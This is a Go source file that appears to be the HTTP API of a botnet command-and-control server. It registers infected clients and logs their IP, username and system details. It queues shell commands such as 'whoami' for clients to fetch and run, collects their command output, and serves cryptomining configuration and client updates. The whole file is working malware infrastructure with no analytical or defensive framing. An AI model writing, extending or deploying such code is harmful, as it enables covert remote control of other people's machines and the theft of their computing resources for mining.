package ccapi

import (
	"bytes"
	"encoding/gob"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/labstack/echo/v4"
	"github.com/titan/tingchao/ccserver/session"
	"github.com/titan/tingchao/model"
	"github.com/titan/tingchao/utils"
)

var SessionManager *session.SessionManager

func init() {
	SessionManager = session.NewSessionManager() // 初始化session管理器
}

// EchoGlobalHandler
//
//	@description  : 全局过滤函数,执行一些鉴权操作
//	@param         {echo.HandlerFunc} next
func EchoGlobalHandler(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		//urlPath := c.Request().RequestURI
		return next(c)
	}
}

// Reg
//
//	@description  :客户端注册和分配Cookie
//	@param         {echo.Context} c
//	@return        {*}
func Reg(c echo.Context) error {
	req := c.Request()
	if req.Body == nil {
		log.Println("[api.Reg]客户端bod为nil,可能是恶意扫描", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}
	defer req.Body.Close()

	data, err := ioutil.ReadAll(req.Body)
	if err != nil { // io读取错误,直接返回500错误
		log.Println("[api.Reg]读取客户端注册信息错误", c.RealIP(), err)
		return c.String(http.StatusInternalServerError, "")
	}

	if len(data) < 1 { // body长度过短,直接返回500错误
		log.Println("[api.Reg]客户端未携带body数据,可能是恶意扫描", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	pm := model.NewPackageModel()
	err = pm.DecodePackage(&data) // 对客户端消息解密
	if err != nil {               // 反序列化失败
		log.Print("[api.Reg]客户端发来的二进制数据有问题,可能被黑客攻击", err)
		return c.String(http.StatusInternalServerError, "")
	}

	rm := pm.MsgList[0].Data.(*model.RegModel) // 获取客户端注册对象

	sess := SessionManager.GetSession(c.Request(), c.Response().Writer)
	cm := model.NewClientModel()
	cm.ClientRegModel = rm

	// 添加测试数据 msg1 msg2
	cm1 := model.NewCcCmdModel()
	cm1.Cmd = "whoami"
	//cm5 := model.NewCcCmdModel()
	//cm5.Cmd = "pwd"

	//msg5 := model.NewMessageModel1(model.MsgCC, cm5)
	msg6 := model.NewMessageModel1(model.MsgCC, cm1)

	//cm.AddServerMsg(msg5)
	cm.AddServerMsg(msg6)

	cm.IPAddress = c.RealIP() //  记录客户端IP

	sess.Set("client_model", cm)

	log.Println("新增客户端:", cm.IPAddress, rm.SystemType, rm.SystemArch, rm.ClientVersion, rm.Username, sess.GetId())

	return c.String(http.StatusOK, "")
}

// GetMsg
//
//	@description  :客户端拉取消息接口
//	@param         {echo.Context} c
//	@return        {*}
func GetMsg(c echo.Context) error {

	// 1. 是否携带名称为 JSESSIONID 的cookie,未携带直接返回500错误
	cookie, err := c.Request().Cookie(utils.GlobalConfig.SessionCookieName)
	if err != nil { // 客户端没有携带cookie,返回500错误
		log.Println("[api.EchoGlobalHandler]获取cookie错误", c.RealIP(), c.Request().RequestURI, err)
		return c.String(http.StatusInternalServerError, "")
	}

	// 2. 是否能根据客户端的cookie找到对应的session,找不到返回401未授权错误
	sess := SessionManager.GetSessionById(cookie.Value)
	if sess == nil { // 服务端没找到session,返回401未授权错误
		log.Println("[api.EchoGlobalHandler]session获取失败,session可能被GC或此访问为恶意访问",
			c.RealIP(), c.Request().RequestURI)
		return c.String(http.StatusUnauthorized, "")
	}

	SessionManager.UpdateSessionLastAccessedTime1(sess) // 更新session访问时间

	// 3. 是否能在session中拿到客户端对象,找不到直接返回500错误
	cm := sess.Get("client_model").(*model.ClientModel) // 从session中获取客户端对象
	if cm == nil {
		log.Println("[api.EchoGlobalHandler]从session中获取client_model失败", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	//cm.IPAddress = c.RealIP() //  记录客户端IP

	//cm := c.Get("client_model").(*model.ClientModel) // 获取客户端对象

	serverMsgList := cm.GetAndRemoveServerMsg() // 拿到客户端待执行命令
	if len(*serverMsgList) == 0 {               // 没有消息，直接返回200状态码
		return c.String(http.StatusOK, "")
	}

	pm := model.NewPackageModel()

	for _, msg := range *serverMsgList { // 将消息填充到包中
		pm.AddMsg1(msg)
	}

	data, err := pm.EncodePackage()
	if err != nil {
		log.Println(err)
		return c.String(http.StatusInternalServerError, "") // 序列化错误，直接返回500错误
	}

	return c.Blob(http.StatusOK, echo.MIMEOctetStream, *data)
}

// Mining
//
//	@description  :返回矿工相关的数据
//	@param         {echo.Context} c
//	@return        {*}
func Mining(c echo.Context) error {

	// 1. 是否携带名称为 JSESSIONID 的cookie,未携带直接返回500错误
	cookie, err := c.Request().Cookie(utils.GlobalConfig.SessionCookieName)
	if err != nil { // 客户端没有携带cookie,返回500错误
		log.Println("[api.EchoGlobalHandler]获取cookie错误", c.RealIP(), c.Request().RequestURI, err)
		return c.String(http.StatusInternalServerError, "")
	}

	// 2. 是否能根据客户端的cookie找到对应的session,找不到返回401未授权错误
	sess := SessionManager.GetSessionById(cookie.Value)
	if sess == nil { // 服务端没找到session,返回401未授权错误
		log.Println("[api.EchoGlobalHandler]session获取失败,session可能被GC或此访问为恶意访问",
			c.RealIP(), c.Request().RequestURI)
		return c.String(http.StatusUnauthorized, "")
	}

	SessionManager.UpdateSessionLastAccessedTime1(sess) // 更新session访问时间

	// 3. 是否能在session中拿到客户端对象,找不到直接返回500错误
	cm := sess.Get("client_model").(*model.ClientModel) // 从session中获取客户端对象
	if cm == nil {
		log.Println("[api.EchoGlobalHandler]从session中获取client_model失败", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	//cm.IPAddress = c.RealIP() //  记录客户端IP

	//cm := c.Get("client_model").(*model.ClientModel) // 获取客户端对象

	mm := model.NewMiningModel(cm)

	pm := model.NewPackageModel()
	pm.AddMsg(model.MsgMining, mm)
	data, err := pm.EncodePackage()
	if err != nil {
		log.Println(err)
		return c.String(http.StatusInternalServerError, "")
	}
	return c.Blob(http.StatusOK, echo.MIMEOctetStream, *data)
}

// Update
//
//	@description  :客户端更新接口
//	@param         {echo.Context} c
//	@return        {*}
func Update(c echo.Context) error {

	// 1. 是否携带名称为 JSESSIONID 的cookie,未携带直接返回500错误
	cookie, err := c.Request().Cookie(utils.GlobalConfig.SessionCookieName)
	if err != nil { // 客户端没有携带cookie,返回500错误
		log.Println("[api.EchoGlobalHandler]获取cookie错误", c.RealIP(), c.Request().RequestURI, err)
		return c.String(http.StatusInternalServerError, "")
	}

	// 2. 是否能根据客户端的cookie找到对应的session,找不到返回401未授权错误
	sess := SessionManager.GetSessionById(cookie.Value)
	if sess == nil { // 服务端没找到session,返回401未授权错误
		log.Println("[api.EchoGlobalHandler]session获取失败,session可能被GC或此访问为恶意访问",
			c.RealIP(), c.Request().RequestURI)
		return c.String(http.StatusUnauthorized, "")
	}

	SessionManager.UpdateSessionLastAccessedTime1(sess) // 更新session访问时间

	// 3. 是否能在session中拿到客户端对象,找不到直接返回500错误
	cm := sess.Get("client_model").(*model.ClientModel) // 从session中获取客户端对象
	if cm == nil {
		log.Println("[api.EchoGlobalHandler]从session中获取client_model失败", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	//cm.IPAddress = c.RealIP() //  记录客户端IP

	//cm := c.Get("client_model").(*model.ClientModel) // 获取客户端对象

	um := model.NewUpdateModel(cm)

	pm := model.NewPackageModel()
	pm.AddMsg(model.MsgUpdate, um)
	data, err := pm.EncodePackage()
	if err != nil {
		log.Println(err)
		return c.String(http.StatusInternalServerError, "")
	}
	return c.Blob(http.StatusOK, echo.MIMEOctetStream, *data)
}

// Submit
//
//	@description  : 客户端数据提交接口
//	@param         {echo.Context} c
//	@return        {*}
func Submit(c echo.Context) error {

	// 1. 是否携带名称为 JSESSIONID 的cookie,未携带直接返回500错误
	cookie, err := c.Request().Cookie(utils.GlobalConfig.SessionCookieName)
	if err != nil { // 客户端没有携带cookie,返回500错误
		log.Println("[api.EchoGlobalHandler]获取cookie错误", c.RealIP(), c.Request().RequestURI, err)
		return c.String(http.StatusInternalServerError, "")
	}

	// 2. 是否能根据客户端的cookie找到对应的session,找不到返回401未授权错误
	sess := SessionManager.GetSessionById(cookie.Value)
	if sess == nil { // 服务端没找到session,返回401未授权错误
		log.Println("[api.EchoGlobalHandler]session获取失败,session可能被GC或此访问为恶意访问",
			c.RealIP(), c.Request().RequestURI)
		return c.String(http.StatusUnauthorized, "")
	}

	SessionManager.UpdateSessionLastAccessedTime1(sess) // 更新session访问时间

	// 3. 是否能在session中拿到客户端对象,找不到直接返回500错误
	cm := sess.Get("client_model").(*model.ClientModel) // 从session中获取客户端对象
	if cm == nil {
		log.Println("[api.EchoGlobalHandler]从session中获取client_model失败", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	//cm.IPAddress = c.RealIP() //  记录客户端IP

	req := c.Request()
	if req.Body == nil {
		log.Println("[api.Submit]客户端body为nil,可能是恶意扫描", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}
	defer req.Body.Close()

	data, err := ioutil.ReadAll(req.Body)
	if err != nil { // io读取错误,直接返回500错误
		log.Println("[api.Submit]读取客户端注册信息错误", c.RealIP(), err)
		return c.String(http.StatusInternalServerError, "")
	}
	if len(data) < 1 { // body长度过短,直接返回500错误
		log.Println("[api.Submit]客户端未携带body数据,可能是恶意扫描", c.RealIP())
		return c.String(http.StatusInternalServerError, "")
	}

	pm := model.NewPackageModel()
	err = pm.DecodePackage(&data) // 对客户端消息解密
	if err != nil {               // 反序列化失败
		log.Print("[api.Submit]反序列化失败,客户端发来的二进制数据有问题,可能被黑客攻击", err)
		return c.String(http.StatusInternalServerError, "")
	}

	//cm := c.Get("client_model").(*model.ClientModel) // 获取客户端对象

	if len(pm.MsgList) == 0 { // 没消息返回500错误
		return c.String(http.StatusInternalServerError, "")
	}

	cm.AddClientMsg(pm.MsgList[0])
	//log.Println(pm.MsgList[0].MsgID)
	//log.Println(pm.MsgList[0].Data.(*model.CcCmdModel).Cmd)
	//log.Println(pm.MsgList[0].Data.(*model.CcCmdModel).ReturnStr)

	return c.String(http.StatusOK, "")
}

// Reg1
//
//	@description  : 压测接口
//	@param         {echo.Context} c
//	@return        {*}
func Reg1(c echo.Context) error {

	req := c.Request()
	body := req.Body
	defer body.Close()
	_, err := ioutil.ReadAll(body)
	if err != nil {
		log.Println("[api.Reg]读取客户端注册信息错误", c.RealIP(), err)
		return c.String(http.StatusBadRequest, "")
	}

	rm := &model.RegModel{
		ClientVersion: "1.1",
		Id:            "123",
		Uid:           "123",
		Gid:           "321",
		Username:      "admin",
		Name:          "admin",
		HomeDir:       "/root",
		SystemType:    "linux",
		SystemArch:    "arm64",
		Hostname:      "admin",
	}

	sess := SessionManager.GetSession(c.Request(), c.Response().Writer)
	cm := model.NewClientModel()
	cm.ClientRegModel = rm
	sess.Set("client_model", cm)

	// 序列化,方便网络传输
	var result bytes.Buffer
	encoder := gob.NewEncoder(&result)
	err = encoder.Encode(rm)
	if err != nil {
		log.Println("[api.Mining]gob序列化错误", c.RealIP(), err)
		return c.String(http.StatusBadRequest, "")
	}

	return c.String(http.StatusOK, "reg1")
}
